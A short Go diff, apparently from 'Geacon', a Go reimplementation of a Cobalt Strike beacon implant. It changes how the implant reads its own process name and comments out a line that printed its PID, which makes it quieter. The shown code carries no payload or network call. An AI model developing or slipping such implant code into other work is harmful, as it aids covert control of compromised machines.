@@ -29,14 +29,17 @@ func GeaconID() int {
 }
 
 func GetProcessName() string {
-	processName := os.Args[0]
+	// argv[0] sometime is null, use os.Executable() instead
+	// https://stackoverflow.com/questions/37211638/why-argv-in-createprocess-is-different-from-normal-c-program
+	// but it can't explain why my `cmd.exe`+`/C cmdline` and `null`+`cmdline` fail to get argv[0]
+	processName, err := os.Executable()
+	if err != nil {
+		return "unknown"
+	}
 	var result string
+	processName = strings.ReplaceAll(processName, "\\", "/")
 	// C:\Users\admin\Desktop\cmd.exe
 	// ./cmd
-	slashPos := strings.LastIndex(processName, "\\")
-	if slashPos > 0 {
-		result = processName[slashPos+1:]
-	}
 	backslashPos := strings.LastIndex(processName, "/")
 	if backslashPos > 0 {
 		result = processName[backslashPos+1:]
@@ -50,7 +53,7 @@ func GetProcessName() string {
 
 func GetPID() int {
 	pid := os.Getpid()
-	util.Println(util.Sprintf("Pid: %d", pid))
+	//util.Println(util.Sprintf("Pid: %d", pid))
 	return pid
 }
 
